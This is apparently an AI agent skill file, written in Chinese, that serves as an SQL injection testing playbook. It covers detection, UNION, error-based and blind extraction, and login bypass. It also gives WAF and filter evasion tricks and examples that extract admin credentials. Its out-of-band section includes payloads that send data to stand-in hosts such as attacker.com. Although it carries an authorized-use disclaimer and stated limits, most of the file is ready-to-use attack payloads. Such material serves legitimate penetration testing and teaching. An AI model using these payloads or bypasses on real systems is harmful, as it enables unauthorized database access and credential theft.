---
name: sql-injection-testing
description: "对 Web 应用执行全面的 SQL 注入漏洞评估，识别数据库安全缺陷，演示利用技术，验证输入净化机制。触发词：SQL注入、SQL注入测试、注入漏洞、数据库安全、SQL安全评估"
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> 仅限授权使用：本技能仅用于授权的安全评估、防御性验证或受控的教育环境。

# SQL 注入测试

## 目的

对 Web 应用执行全面的 SQL 注入漏洞评估，识别数据库安全缺陷，演示利用技术，验证输入净化机制。本技能支持对带内注入（In-band）、盲注（Blind）和带外注入（Out-of-Band）攻击向量进行系统化检测和利用，以评估应用安全态势。

## 输入 / 前置条件

### 所需权限
- 目标 Web 应用 URL 及可注入参数
- Burp Suite 或等效代理工具用于请求操作
- SQLMap 安装用于自动化利用
- 启用开发者工具的浏览器

### 技术要求
- 理解 SQL 查询语法（MySQL、MSSQL、PostgreSQL、Oracle）
- 了解 HTTP 请求/响应周期
- 熟悉数据库模式和结构
- 测试报告的写入权限

### 法律前提
- 渗透测试的书面授权
- 明确的测试范围，包括目标 URL 和参数
- 已建立紧急联系流程
- 数据处理协议已就位

## 输出 / 交付物

### 主要输出
- 带严重等级的 SQL 注入漏洞报告
- 提取的数据库模式和表结构
- 认证绕过的概念验证演示
- 带代码示例的修复建议

### 证据材料
- 成功注入的截图
- HTTP 请求/响应日志
- 数据库转储（已脱敏）
- Payload 文档

## 核心工作流

### 阶段一：检测与侦察

#### 识别可注入参数
定位与数据库查询交互的用户可控输入字段：

```
# 常见注入点
- URL 参数：?id=1, ?user=admin, ?category=books
- 表单字段：username, password, search, comments
- Cookie 值：session_id, user_preference
- HTTP 头部：User-Agent, Referer, X-Forwarded-For
```

#### 测试基本漏洞指标
插入特殊字符触发错误响应：

```sql
-- 单引号测试
'

-- 双引号测试
"

-- 注释序列
--
#
/**/

-- 分号用于堆叠查询
;

-- 括号
)
```

监控应用响应：
- 暴露查询结构的数据库错误消息
- 意外的应用行为变化
- HTTP 500 内部服务器错误
- 响应内容或长度的变化

#### 逻辑测试 Payload
验证布尔型漏洞的存在：

```sql
-- 真条件测试
page.asp?id=1 or 1=1
page.asp?id=1' or 1=1--
page.asp?id=1" or 1=1--

-- 假条件测试  
page.asp?id=1 and 1=2
page.asp?id=1' and 1=2--
```

对比真条件和假条件的响应以确认注入能力。

### 阶段二：利用技术

#### UNION 提取
将攻击者控制的 SELECT 语句与原始查询组合：

```sql
-- 确定列数
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
-- 继续直到出错

-- 查找可显示的列
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--
UNION SELECT NULL,'a',NULL--

-- 提取数据
UNION SELECT username,password,NULL FROM users--
UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

#### 报错注入提取
强制数据库泄露信息的错误：

```sql
-- MSSQL 版本提取
1' AND 1=CONVERT(int,(SELECT @@version))--

-- MySQL 通过 XPATH 提取
1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--

-- PostgreSQL 类型转换错误
1' AND 1=CAST((SELECT version()) AS int)--
```

#### 布尔盲注提取
通过应用行为变化推断数据：

```sql
-- 字符提取
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--

-- 条件响应
1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
```

#### 时间盲注提取
使用数据库休眠函数进行确认：

```sql
-- MySQL
1' AND IF(1=1,SLEEP(5),0)--
1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--

-- MSSQL
1'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
1'; SELECT pg_sleep(5)--
```

#### 带外（OOB）提取
通过外部通道外泄数据：

```sql
-- MSSQL DNS 外泄
1; EXEC master..xp_dirtree '\\attacker-server.com\share'--

-- MySQL DNS 外泄
1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))--

-- Oracle HTTP 请求
1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
```

### 阶段三：认证绕过

#### 登录表单利用
构造绕过凭证验证的 Payload：

```sql
-- 经典绕过
admin'--
admin'/*
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
') OR ('1'='1
') OR ('1'='1'--

-- 用户名枚举
admin' AND '1'='1
admin' AND '1'='2
```

查询转换示例：
```sql
-- 原始查询
SELECT * FROM users WHERE username='input' AND password='input'

-- 注入后（用户名：admin'--）
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- 通过注释绕过密码检查
```

### 阶段四：过滤绕过技术

#### 字符编码绕过
当特殊字符被过滤时：

```sql
-- URL 编码
%27（单引号）
%22（双引号）
%23（井号）

-- 双重 URL 编码
%2527（单引号）

-- Unicode 替代
U+0027（撇号）
U+02B9（修饰字母撇号）

-- 十六进制字符串（MySQL）
SELECT * FROM users WHERE name=0x61646D696E  -- 'admin' 的十六进制
```

#### 空白字符绕过
替换被过滤的空格：

```sql
-- 注释替代
SELECT/**/username/**/FROM/**/users
SEL/**/ECT/**/username/**/FR/**/OM/**/users

-- 替代空白字符
SELECT%09username%09FROM%09users  -- 制表符
SELECT%0Ausername%0AFROM%0Ausers  -- 换行符
```

#### 关键字绕过
规避被拉黑的 SQL 关键字：

```sql
-- 大小写变化
SeLeCt, sElEcT, SELECT

-- 内联注释
SEL/*bypass*/ECT
UN/*bypass*/ION

-- 双写（如果过滤器只移除一次）
SELSELECTECT → SELECT
UNUNIONION → UNION

-- 空字节注入
%00SELECT
SEL%00ECT
```

## 快速参考

### 检测测试序列
```
1. 插入 ' → 检查错误
2. 插入 " → 检查错误
3. 尝试：OR 1=1-- → 检查行为变化
4. 尝试：AND 1=2-- → 检查行为变化
5. 尝试：' WAITFOR DELAY '0:0:5'-- → 检查延迟
```

### 数据库指纹识别
```sql
-- MySQL
SELECT @@version
SELECT version()

-- MSSQL
SELECT @@version
SELECT @@servername

-- PostgreSQL
SELECT version()

-- Oracle
SELECT banner FROM v$version
SELECT * FROM v$version
```

### Information Schema 查询
```sql
-- MySQL/MSSQL 表枚举
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- 列枚举
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Oracle 等效查询
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

### 常用 Payload 速查表
| 用途 | Payload |
|------|---------|
| 基本测试 | `'` 或 `"` |
| 布尔真 | `OR 1=1--` |
| 布尔假 | `AND 1=2--` |
| 注释（MySQL） | `#` 或 `-- ` |
| 注释（MSSQL） | `--` |
| UNION 探测 | `UNION SELECT NULL--` |
| 时间延迟 | `AND SLEEP(5)--` |
| 认证绕过 | `' OR '1'='1` |

## 约束与防护

### 操作边界
- 未经明确授权，禁止执行破坏性查询（DROP、DELETE、TRUNCATE）
- 数据提取限制在概念验证数量范围内
- 避免通过资源密集型查询造成拒绝服务
- 检测到包含真实用户数据的生产数据库时立即停止

### 技术限制
- WAF/IPS 可能拦截常见 Payload，需要使用绕过技术
- 参数化查询可防止标准注入
- 部分盲注需要大量请求（存在频率限制问题）
- 二阶注入需要理解数据流

### 法律与道德要求
- 测试前必须存在书面范围协议
- 记录所有提取的数据，按数据保护要求处理
- 通过约定渠道立即报告严重漏洞
- 不得访问超出范围的数据

## 示例

### 示例一：电商产品页面 SQL 注入

**场景**：测试带 ID 参数的产品展示页面

**初始请求**：
```
GET /product.php?id=5 HTTP/1.1
```

**检测测试**：
```
GET /product.php?id=5' HTTP/1.1
响应：MySQL 错误 - 语法错误 near '''
```

**列枚举**：
```
GET /product.php?id=5 ORDER BY 4-- HTTP/1.1
响应：正常
GET /product.php?id=5 ORDER BY 5-- HTTP/1.1
响应：错误（确认 4 列）
```

**数据提取**：
```
GET /product.php?id=-5 UNION SELECT 1,username,password,4 FROM admin_users-- HTTP/1.1
响应：显示管理员凭证
```

### 示例二：时间盲注提取

**场景**：无可见输出，测试盲注

**确认漏洞**：
```sql
id=5' AND SLEEP(5)-- 
-- 响应延迟 5 秒（确认存在漏洞）
```

**提取数据库名长度**：
```sql
id=5' AND IF(LENGTH(database())=8,SLEEP(5),0)--
-- 延迟确认数据库名为 8 个字符
```

**提取字符**：
```sql
id=5' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
-- 逐个字符迭代提取：'appstore'
```

### 示例三：登录绕过

**目标**：管理员登录表单

**标准登录查询**：
```sql
SELECT * FROM users WHERE username='[input]' AND password='[input]'
```

**注入 Payload**：
```
用户名：administrator'--
密码：anything
```

**生成的查询**：
```sql
SELECT * FROM users WHERE username='administrator'--' AND password='anything'
```

**结果**：密码检查被绕过，以 administrator 身份认证成功。

## 故障排查

### 无错误消息显示
- 应用使用了通用错误处理
- 切换到盲注技术（布尔型或时间型）
- 监控响应长度差异而非内容

### UNION 注入失败
- 列数可能不正确 → 用 ORDER BY 测试
- 数据类型可能不匹配 → 先对所有列使用 NULL
- 结果可能未显示 → 查找可注入的列位置

### WAF 拦截请求
- 使用编码技术（URL、十六进制、Unicode）
- 在关键字中插入内联注释
- 尝试相同操作的替代语法
- 将 Payload 分散到多个参数中

### Payload 未执行
- 验证所用数据库类型的注释语法是否正确
- 检查应用是否使用了参数化查询
- 确认输入到达了 SQL 查询（而非在客户端被过滤）
- 测试不同的注入点（头部、Cookie）

### 时间盲注不一致
- 网络延迟可能导致误报
- 使用更长的延迟（10 秒以上）以提高准确性
- 运行多次测试以确认模式
- 考虑服务端缓存的影响

## 使用场景
本技能适用于执行概述中描述的工作流或操作。
